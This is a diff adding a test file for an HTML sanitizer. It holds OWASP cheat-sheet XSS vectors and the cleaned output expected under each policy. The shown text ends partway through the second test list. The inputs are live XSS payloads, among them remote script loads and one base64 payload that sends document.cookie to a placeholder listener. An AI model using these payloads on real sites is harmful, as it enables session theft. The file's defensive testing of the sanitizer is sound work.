@@ -1,0 +1,635 @@
+# The XSS vectors of OWASP's XSS Filter Evasion Cheat Sheet, every one a
+# test: the cheat sheet's Markdown (github.com/OWASP/CheatSheetSeries,
+# `cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.md`, fetched 2026-11-17, its
+# SHA-256 beginning `7e298e2905c7c4ad`), each fenced block as it is written,
+# again with its no-break spaces read as the spaces they stand for and with the
+# backslashes its Markdown adds taken out, every string of its lists of
+# firewall bypasses and of obfuscations of `alert`, every event handler of its
+# list on a paragraph, and every one of its ways of writing `<` around a
+# script: 395 vectors.
+#
+# Each is cleaned by the three ready policies. Under each, the answer cleaned
+# again is the same bytes, and read as a browser reads it the answer holds no
+# element the policy does not keep, no event handler, no `srcdoc`, no `style`,
+# no comment, and no URL whose scheme a browser reads as other than `http`,
+# `https` or `mailto`; that reading is this module's own, written apart from
+# the package's. Under the policy for user-generated content the answer is
+# pinned: each is the answer nh3 0.3.8 (Rust's ammonia 4) gives with the same
+# lists of elements, attributes and schemes, once both write a quotation mark
+# and a no-break space alike, but where nh3 adds a `rel` to a link that has no
+# `href` and keeps four relative URLs that `url` cannot read, which this
+# package takes out (the ledger's note). Every answer was also read by Go's
+# `golang.org/x/net/html`, which wrote back the same tree.
+#
+# Beside them, 47 shapes of mutation XSS gathered for this package (namespace
+# confusion, raw text, comments and instructions) are held to the same
+# reading, with no answer pinned.
+#
+# Nothing here is compiled into a program but the functions and the record
+# below; the vectors live in the tests.
+
+use html
+use html/sanitize/internal/ready
+use html/sanitize/internal/rules
+use html/sanitize/internal/walk
+use strings
+
+# The cheat sheet the vectors were taken from, and the beginning of its
+# SHA-256.
+constant SOURCE: str
+    "XSS_Filter_Evasion_Cheat_Sheet.md sha256 7e298e2905c7c4ad"
+
+# One vector and what the policy for user-generated content answers.
+record Vector
+    # The vector, as the cheat sheet writes it.
+    text: str
+    # The answer of `ready.ugc()`.
+    ugc: str
+
+# The scheme a browser reads in the URL `value`, in lower case, written apart
+# from the package's own reading: tabs and line breaks taken out, everything
+# up to 32 cut from both ends, then a letter and letters, digits, `+`, `-` or
+# `.` before a `:`; empty where there is none.
+function scheme_seen(value: str) -> str
+    pieces: [str] @= []
+
+    for c in value.chars()
+        if c != "\t" && c != "\n" && c != "\r"
+            pieces @ pieces.push(c)
+
+    form = pieces.join("")
+    first: i64 @= 0
+
+    while first < form.len() && form[first] <= 32
+        first @ first + 1
+
+    at: i64 @= first
+
+    while at < form.len()
+        b = form[at]
+        is_letter = b >= 'a' && b <= 'z' || b >= 'A' && b <= 'Z'
+
+        if b == ':' && at > first
+            return strings.to_lower_ascii(form.slice(from: first, to: at))
+
+        if !(is_letter || at > first && (b >= '0' && b <= '9' || b == '+' || b == '-' || b == '.'))
+            return ""
+        at @ at + 1
+
+    return ""
+
+# Whether `text`, read as a browser reads it inside the context of `r`, holds
+# only what `r` keeps: no element `r` does not allow, no attribute that is an
+# event handler, `srcdoc` or `style`, no comment, and no URL of a scheme other
+# than `http`, `https` and `mailto`.
+function is_inert(r: rules.Rules, text: str) -> bool
+    doc = html.parse_fragment(text: text, context: r.context)
+
+    for n in html.descendants(doc, html.ROOT)
+        match html.node_of(doc, n)
+            .element e =>
+                space = match e.space
+                    .html   => rules.HTML
+                    .svg    => rules.SVG
+                    .mathml => rules.MATHML
+
+                if rules.action_of(r, space, e.name) != rules.ALLOW
+                    return false
+
+                for a in e.attributes
+                    lower = a.name
+
+                    if lower.len() >= 2 && (lower[0] == 'o' || lower[0] == 'O') && (lower[1] == 'n' || lower[1] == 'N')
+                        return false
+
+                    if lower == "srcdoc" || lower == "style"
+                        return false
+
+                    if lower == "href" || lower == "src" || lower == "cite" || lower == "action" || lower == "formaction" || lower == "background" || lower == "poster" || lower == "lowsrc" || lower == "dynsrc" || lower == "data"
+                        seen = scheme_seen(a.value)
+
+                        if !(seen == "" || seen == "http" || seen == "https" || seen == "mailto")
+                            return false
+            .comment _                                                    => return false
+            .document | .fragment | .doctype _ | .text _ | .instruction _ => _ = 0
+
+    return true
+
+# Whether every policy keeps `text` inert and cleans its answer to the same
+# bytes, and the policy for user-generated content answers `ugc`.
+function holds(v: Vector) -> bool
+    for r in [ready.ugc(), rules.empty(), ready.rich_text()]
+        once = walk.cleaned_text(r, v.text)
+
+        if walk.cleaned_text(r, once) != once || !is_inert(r, once)
+            return false
+
+    return walk.cleaned_text(ready.ugc(), v.text) == v.ugc
+
+# Whether every ready policy keeps `text` inert and cleans its answer to the
+# same bytes, with no answer pinned.
+function settles(text: str) -> bool
+    for r in [ready.ugc(), rules.empty(), ready.rich_text()]
+        once = walk.cleaned_text(r, text)
+
+        if walk.cleaned_text(r, once) != once || !is_inert(r, once)
+            return false
+
+    return true
+
+test "OWASP: the cheat sheet's fenced vectors, as published, 112"
+    vectors = [
+        Vector(text: "<SCRIPT SRC=https://example.com/xss-test.js></SCRIPT>", ugc: "")
+        Vector(text: "javascript:/*--></title></style></textarea></script></xmp>\n<svg/onload='+/\"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>", ugc: "javascript:/*--&gt;\n")
+        Vector(text: "\\<a onmouseover=\"alert(document.cookie)\"\\>xxs link\\</a\\>", ugc: "\\<a>xxs link\\</a>")
+        Vector(text: "\\<a onmouseover=alert(document.cookie)\\>xxs link\\</a\\>", ugc: "\\<a>xxs link\\</a>")
+        Vector(text: "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\"\\>", ugc: "\"\\&gt;")
+        Vector(text: "<a href=\"javascript:alert(String.fromCharCode(88,83,83))\">Click Me!</a>", ugc: "<a>Click Me!</a>")
+        Vector(text: "<IMG SRC=# onmouseover=\"alert('xxs')\">", ugc: "<img src=\"#\">")
+        Vector(text: "<IMG SRC= onmouseover=\"alert('xxs')\">", ugc: "<img src=\"onmouseover=&quot;alert('xxs')&quot;\">")
+        Vector(text: "<IMG onmouseover=\"alert('xxs')\">", ugc: "<img>")
+        Vector(text: "<IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"></img>", ugc: "<img src=\"/\">")
+        Vector(text: "<img src=x onerror=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041\">", ugc: "<img src=\"x\">")
+        Vector(text: "\n <a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;\">Click Me!</a>", ugc: "\n <a>Click Me!</a>")
+        Vector(text: "<a href=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041\">Click Me</a>", ugc: "<a>Click Me</a>")
+        Vector(text: "<a href=\"&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29\">Click Me</a>", ugc: "<a>Click Me</a>")
+        Vector(text: " <a href=\"jav\tascript:alert('XSS');\">Click Me</a>", ugc: " <a>Click Me</a>")
+        Vector(text: " <a href=\"jav&#x09;ascript:alert('XSS');\">Click Me</a>", ugc: " <a>Click Me</a>")
+        Vector(text: "<a href=\"jav&#x0A;ascript:alert('XSS');\">Click Me</a>", ugc: "<a>Click Me</a>")
+        Vector(text: "<a href=\"jav&#x0D;ascript:alert('XSS');\">Click Me</a>", ugc: "<a>Click Me</a>")
+        Vector(text: "perl -e 'print \"<IMG SRC=java\\0script:alert(\\\"XSS\\\")>\";' > out", ugc: "perl&nbsp;-e&nbsp;'print&nbsp;\"<img>\";'&nbsp;&gt;&nbsp;out")
+        Vector(text: "<a href=\" &#14;  javascript:alert('XSS');\">Click Me</a>", ugc: "<a>Click Me</a>")
+        Vector(text: "<SCRIPT/XSS SRC=\"http://xss.rocks/xss.js\"></SCRIPT>", ugc: "")
+        Vector(text: "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>", ugc: "")
+        Vector(text: "<SCRIPT/SRC=\"http://xss.rocks/xss.js\"></SCRIPT>", ugc: "")
+        Vector(text: "<<SCRIPT>alert(\"XSS\");//\\<</SCRIPT>", ugc: "&lt;")
+        Vector(text: "<SCRIPT SRC=http://xss.rocks/xss.js?< B >", ugc: "")
+        Vector(text: "<SCRIPT SRC=//xss.rocks/.j>", ugc: "")
+        Vector(text: "<IMG SRC=\"`<javascript:alert>`('XSS')\"", ugc: "`('XSS')\"")
+        Vector(text: "\\\";alert('XSS');//", ugc: "\\\";alert('XSS');//")
+        Vector(text: "</script><script>alert('XSS');</script>", ugc: "")
+        Vector(text: "</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>", ugc: "")
+        Vector(text: "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">", ugc: "")
+        Vector(text: "<BODY BACKGROUND=\"javascript:alert('XSS')\">", ugc: "")
+        Vector(text: "<IMG DYNSRC=\"javascript:alert('XSS')\">", ugc: "")
+        Vector(text: "<IMG LOWSRC=\"javascript:alert('XSS')\">", ugc: "")
+        Vector(text: "<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS</br>", ugc: "<ul><li>XSS<br></li></ul>")
+        Vector(text: "<IMG SRC='vbscript:msgbox(\"XSS\")'>", ugc: "")
+        Vector(text: "<svg/onload=alert('XSS')>", ugc: "")
+        Vector(text: "Set.constructor`alert\\x28document.domain\\x29", ugc: "Set.constructor`alert\\x28document.domain\\x29")
+        Vector(text: "<BODY ONLOAD=alert('XSS')>", ugc: "")
+        Vector(text: "<BGSOUND SRC=\"javascript:alert('XSS');\">", ugc: "")
+        Vector(text: "<BR SIZE=\"&{alert('XSS')}\">", ugc: "")
+        Vector(text: "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">", ugc: "")
+        Vector(text: "<LINK REL=\"stylesheet\" HREF=\"http://xss.rocks/xss.css\">", ugc: "")
+        Vector(text: "<STYLE>@import'http://xss.rocks/xss.css';</STYLE>", ugc: "")
+        Vector(text: "<STYLE>BODY{-moz-binding:url(\"http://xss.rocks/xssmoz.xml#xss\")}</STYLE>", ugc: "")
+        Vector(text: "<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>", ugc: "")
+        Vector(text: "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">", ugc: "")
+        Vector(text: "exp/*<A STYLE='no\\xss:noxss(\"*//*\");\nxss:ex/*XSS*//*/*/pression(alert(\"XSS\"))'>", ugc: "exp/*")
+        Vector(text: "<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>", ugc: "")
+        Vector(text: "<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>\n<STYLE type=\"text/css\">BODY{background:url(\"<javascript:alert>('XSS')\")}</STYLE>", ugc: "BODY{background:url(\"javascript:alert('XSS')\")}\n")
+        Vector(text: "<XSS STYLE=\"xss:expression(alert('XSS'))\">", ugc: "")
+        Vector(text: "<XSS STYLE=\"behavior: url(xss.htc);\">", ugc: "")
+        Vector(text: "¼script¾alert(¢XSS¢)¼/script¾", ugc: "¼script¾alert(¢XSS¢)¼/script¾")
+        Vector(text: "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">", ugc: "")
+        Vector(text: "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">", ugc: "")
+        Vector(text: "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">", ugc: "")
+        Vector(text: "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>", ugc: "")
+        Vector(text: "<IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>", ugc: "")
+        Vector(text: "<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>", ugc: "")
+        Vector(text: "<TABLE BACKGROUND=\"javascript:alert('XSS')\">", ugc: "")
+        Vector(text: "<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">", ugc: "<table></table>")
+        Vector(text: "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">", ugc: "")
+        Vector(text: "<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\">", ugc: "")
+        Vector(text: "<DIV STYLE=\"background-image: url(\u{1}javascript:alert('XSS'))\">", ugc: "")
+        Vector(text: "<DIV STYLE=\"width: expression(alert('XSS'));\">", ugc: "")
+        Vector(text: "<!--[if gte IE 4]>\n<SCRIPT>alert('XSS');</SCRIPT>\n<![endif]-->", ugc: "")
+        Vector(text: "<BASE HREF=\"javascript:alert('XSS');//\">", ugc: "")
+        Vector(text: "<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://xss.rocks/scriptlet.html\"></OBJECT>", ugc: "")
+        Vector(text: "<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>", ugc: "")
+        Vector(text: "<XML ID=\"xss\"><I><B><IMG SRC=\"javas<!-- -->cript:alert('XSS')\"></B></I></XML>\n<SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"></SPAN>", ugc: "<i><b>cript:alert('XSS')\"&gt;</b></i>\n")
+        Vector(text: "<XML SRC=\"xsstest.xml\" ID=I></XML>\n<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>", ugc: "\n")
+        Vector(text: "<HTML><BODY>\n<?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\">\n<?import namespace=\"t\" implementation=\"#default#time2\">\n<t:set attributeName=\"innerHTML\" to=\"XSS<SCRIPT DEFER>alert(\"XSS\")</SCRIPT>\">\n</BODY></HTML>", ugc: "\n\n\nalert(\"XSS\")\"&gt;\n")
+        Vector(text: "<SCRIPT SRC=\"http://xss.rocks/xss.jpg\"></SCRIPT>", ugc: "")
+        Vector(text: "<!--#exec cmd=\"/bin/echo '<SCR'\"--><!--#exec cmd=\"/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'\"-->", ugc: "")
+        Vector(text: "<? echo('<SCR)';\necho('IPT>alert(\"XSS\")</SCRIPT>'); ?>", ugc: "alert(\"XSS\")');&nbsp;?&gt;")
+        Vector(text: "<IMG SRC=\"http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode\">", ugc: "")
+        Vector(text: "Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser", ugc: "Redirect&nbsp;302&nbsp;/a.jpg&nbsp;http://victimsite.com/admin.asp&amp;deleteuser")
+        Vector(text: "<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=<SCRIPT>alert('XSS')</SCRIPT>\">", ugc: "alert('XSS')\"&gt;")
+        Vector(text: "<SCRIPT a=\">\" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>", ugc: "\"&nbsp;SRC=\"httx://xss.rocks/xss.js\"&gt;")
+        Vector(text: "<SCRIPT =\">\" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>", ugc: "\"&nbsp;SRC=\"httx://xss.rocks/xss.js\"&gt;")
+        Vector(text: "<SCRIPT a=\">\" '' SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>", ugc: "\"&nbsp;''&nbsp;SRC=\"httx://xss.rocks/xss.js\"&gt;")
+        Vector(text: "<SCRIPT \"a='>'\" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>", ugc: "'\"&nbsp;SRC=\"httx://xss.rocks/xss.js\"&gt;")
+        Vector(text: "<SCRIPT a=`>` SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>", ugc: "`&nbsp;SRC=\"httx://xss.rocks/xss.js\"&gt;")
+        Vector(text: "<SCRIPT a=\">'>\" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>", ugc: "'&gt;\"&nbsp;SRC=\"httx://xss.rocks/xss.js\"&gt;")
+        Vector(text: "<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>", ugc: "PT&nbsp;SRC=\"httx://xss.rocks/xss.js\"&gt;")
+        Vector(text: "<A HREF=\"http://66.102.7.147/\">XSS</A>", ugc: "XSS")
+        Vector(text: "<A HREF=\"http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\">XSS</A>", ugc: "XSS")
+        Vector(text: "<A HREF=\"http://1113982867/\">XSS</A>", ugc: "XSS")
+        Vector(text: "<A HREF=\"http://0x42.0x0000066.0x7.0x93/\">XSS</A>", ugc: "XSS")
+        Vector(text: "<A HREF=\"http://0102.0146.0007.00000223/\">XSS</A>", ugc: "XSS")
+        Vector(text: "<img onload=\"eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))\">", ugc: "")
+        Vector(text: "<A HREF=\"h\ntt  p://6\t6.000146.0x7.147/\">XSS</A>", ugc: "XSS")
+        Vector(text: "<A HREF=\"//www.google.com/\">XSS</A>", ugc: "XSS")
+        Vector(text: "<A HREF=\"http://google.com/\">XSS</A>", ugc: "XSS")
+        Vector(text: "<A HREF=\"http://www.google.com./\">XSS</A>", ugc: "XSS")
+        Vector(text: "<A HREF=\"javascript:document.location='http://www.google.com/'\">XSS</A>", ugc: "XSS")
+        Vector(text: "<A HREF=\"http://www.google.com/ogle.com/\">XSS</A>", ugc: "XSS")
+        Vector(text: "a href=\"/Share?content_type=1&title=<%=Encode.forHtmlAttribute(untrusted content title)%>\">Share</a>", ugc: "a href=\"/Share?content_type=1&amp;title=&lt;%=Encode.forHtmlAttribute(untrusted content title)%&gt;\"&gt;Share")
+        Vector(text: "<script>\nvar contentType = <%=Request.getParameter(\"content_type\")%>;\nvar title = \"<%=Encode.forJavaScript(request.getParameter(\"title\"))%>\";\n...\n//some user agreement and sending to server logic might be here\n...\n</script>", ugc: "")
+        Vector(text: "<a href=\"/share?content_type=1&title=This is a regular title&amp;content_type=1;alert(1)\">Share</a>", ugc: "<a href=\"/share?content_type=1&amp;title=This is a regular title&amp;content_type=1;alert(1)\" rel=\"nofollow\">Share</a>")
+        Vector(text: "<script>\nvar contentType = 1; alert(1);\nvar title = \"This is a regular title\";\n…\n//some user agreement and sending to server logic might be here\n…\n</script>", ugc: "")
+        Vector(text: "<script> ... setTimeout(\\\\\"writetitle()\\\\\",$\\_GET\\[xss\\]) ... </script>", ugc: "")
+        Vector(text: "/?xss=500); alert(document.cookie);//", ugc: "/?xss=500);&nbsp;alert(document.cookie);//")
+        Vector(text: "<script> ... eval($\\_GET\\[xss\\]); ... </script>", ugc: "")
+        Vector(text: "/?xss=document.cookie", ugc: "/?xss=document.cookie")
+        Vector(text: "...\nheader('Location: '.$_GET['param']);\n...", ugc: "...\nheader('Location:&nbsp;'.$_GET['param']);\n...")
+        Vector(text: "...\nheader('Refresh: 0; URL='.$_GET['param']);\n...", ugc: "...\nheader('Refresh:&nbsp;0;&nbsp;URL='.$_GET['param']);\n...")
+        Vector(text: "/?param=<javascript:alert(document.cookie>)", ugc: "/?param=)")
+        Vector(text: "/?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=", ugc: "/?param=")
+        Vector(text: "<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script", ugc: "")
+        Vector(text: "<script x> alert(1) </script 1=2", ugc: "")
+        Vector(text: "&#96;`${alert``}`&#96;", ugc: "``${alert``}``")
+    ]
+
+    for v in vectors
+        assert holds(v)
+
+test "OWASP: the cheat sheet's fenced vectors, their no-break spaces read as spaces, 68"
+    vectors = [
+        Vector(text: "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\"\\>", ugc: "<img>\"\\&gt;")
+        Vector(text: "perl -e 'print \"<IMG SRC=java\\0script:alert(\\\"XSS\\\")>\";' > out", ugc: "perl -e 'print \"<img>\";' &gt; out")
+        Vector(text: "<SCRIPT/XSS SRC=\"http://xss.rocks/xss.js\"></SCRIPT>", ugc: "")
+        Vector(text: "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>", ugc: "")
+        Vector(text: "<SCRIPT SRC=http://xss.rocks/xss.js?< B >", ugc: "")
+        Vector(text: "<SCRIPT SRC=//xss.rocks/.j>", ugc: "")
+        Vector(text: "<IMG SRC=\"`<javascript:alert>`('XSS')\"", ugc: "")
+        Vector(text: "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">", ugc: "")
+        Vector(text: "<BODY BACKGROUND=\"javascript:alert('XSS')\">", ugc: "")
+        Vector(text: "<IMG DYNSRC=\"javascript:alert('XSS')\">", ugc: "<img>")
+        Vector(text: "<IMG LOWSRC=\"javascript:alert('XSS')\">", ugc: "<img>")
+        Vector(text: "<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS</br>", ugc: "<ul><li>XSS<br></li></ul>")
+        Vector(text: "<IMG SRC='vbscript:msgbox(\"XSS\")'>", ugc: "<img>")
+        Vector(text: "<BODY ONLOAD=alert('XSS')>", ugc: "")
+        Vector(text: "<BR SIZE=\"&{alert('XSS')}\">", ugc: "<br>")
+        Vector(text: "<LINK REL=\"stylesheet\" HREF=\"http://xss.rocks/xss.css\">", ugc: "")
+        Vector(text: "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">", ugc: "<img>")
+        Vector(text: "exp/*<A STYLE='no\\xss:noxss(\"*//*\");\nxss:ex/*XSS*//*/*/pression(alert(\"XSS\"))'>", ugc: "exp/*<a></a>")
+        Vector(text: "<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>", ugc: "<a></a>")
+        Vector(text: "<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>\n<STYLE type=\"text/css\">BODY{background:url(\"<javascript:alert>('XSS')\")}</STYLE>", ugc: "\n")
+        Vector(text: "<XSS STYLE=\"xss:expression(alert('XSS'))\">", ugc: "")
+        Vector(text: "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">", ugc: "")
+        Vector(text: "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">", ugc: "")
+        Vector(text: "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">", ugc: "")
+        Vector(text: "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>", ugc: "")
+        Vector(text: "<IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>", ugc: "")
+        Vector(text: "<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>", ugc: "")
+        Vector(text: "<TABLE BACKGROUND=\"javascript:alert('XSS')\">", ugc: "<table></table>")
+        Vector(text: "<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">", ugc: "<table><tbody><tr><td></td></tr></tbody></table>")
+        Vector(text: "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">", ugc: "<div></div>")
+        Vector(text: "<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\">", ugc: "<div></div>")
+        Vector(text: "<DIV STYLE=\"background-image: url(\u{1}javascript:alert('XSS'))\">", ugc: "<div></div>")
+        Vector(text: "<DIV STYLE=\"width: expression(alert('XSS'));\">", ugc: "<div></div>")
+        Vector(text: "<!--[if gte IE 4]>\n<SCRIPT>alert('XSS');</SCRIPT>\n<![endif]-->", ugc: "")
+        Vector(text: "<BASE HREF=\"javascript:alert('XSS');//\">", ugc: "")
+        Vector(text: "<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://xss.rocks/scriptlet.html\"></OBJECT>", ugc: "")
+        Vector(text: "<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>", ugc: "")
+        Vector(text: "<XML ID=\"xss\"><I><B><IMG SRC=\"javas<!-- -->cript:alert('XSS')\"></B></I></XML>\n<SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"></SPAN>", ugc: "<i><b><img></b></i>\n<span></span>")
+        Vector(text: "<XML SRC=\"xsstest.xml\" ID=I></XML>\n<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>", ugc: "\n<span></span>")
+        Vector(text: "<HTML><BODY>\n<?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\">\n<?import namespace=\"t\" implementation=\"#default#time2\">\n<t:set attributeName=\"innerHTML\" to=\"XSS<SCRIPT DEFER>alert(\"XSS\")</SCRIPT>\">\n</BODY></HTML>", ugc: "\n\n\n\"&gt;\n")
+        Vector(text: "<SCRIPT SRC=\"http://xss.rocks/xss.jpg\"></SCRIPT>", ugc: "")
+        Vector(text: "<!--#exec cmd=\"/bin/echo '<SCR'\"--><!--#exec cmd=\"/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'\"-->", ugc: "")
+        Vector(text: "<? echo('<SCR)';\necho('IPT>alert(\"XSS\")</SCRIPT>'); ?>", ugc: "alert(\"XSS\")'); ?&gt;")
+        Vector(text: "<IMG SRC=\"http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode\">", ugc: "<img src=\"http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode\">")
+        Vector(text: "Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser", ugc: "Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser")
+        Vector(text: "<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=<SCRIPT>alert('XSS')</SCRIPT>\">", ugc: "")
+        Vector(text: "<SCRIPT a=\">\" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>", ugc: "")
+        Vector(text: "<SCRIPT =\">\" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>", ugc: "")
+        Vector(text: "<SCRIPT a=\">\" '' SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>", ugc: "")
+        Vector(text: "<SCRIPT \"a='>'\" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>", ugc: "")
+        Vector(text: "<SCRIPT a=`>` SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>", ugc: "")
+        Vector(text: "<SCRIPT a=\">'>\" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>", ugc: "")
+        Vector(text: "<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>", ugc: "PT SRC=\"httx://xss.rocks/xss.js\"&gt;")
+        Vector(text: "<A HREF=\"http://66.102.7.147/\">XSS</A>", ugc: "<a href=\"http://66.102.7.147/\" rel=\"nofollow\">XSS</a>")
+        Vector(text: "<A HREF=\"http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\">XSS</A>", ugc: "<a href=\"http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\" rel=\"nofollow\">XSS</a>")
+        Vector(text: "<A HREF=\"http://1113982867/\">XSS</A>", ugc: "<a href=\"http://1113982867/\" rel=\"nofollow\">XSS</a>")
+        Vector(text: "<A HREF=\"http://0x42.0x0000066.0x7.0x93/\">XSS</A>", ugc: "<a href=\"http://0x42.0x0000066.0x7.0x93/\" rel=\"nofollow\">XSS</a>")
+        Vector(text: "<A HREF=\"http://0102.0146.0007.00000223/\">XSS</A>", ugc: "<a href=\"http://0102.0146.0007.00000223/\" rel=\"nofollow\">XSS</a>")
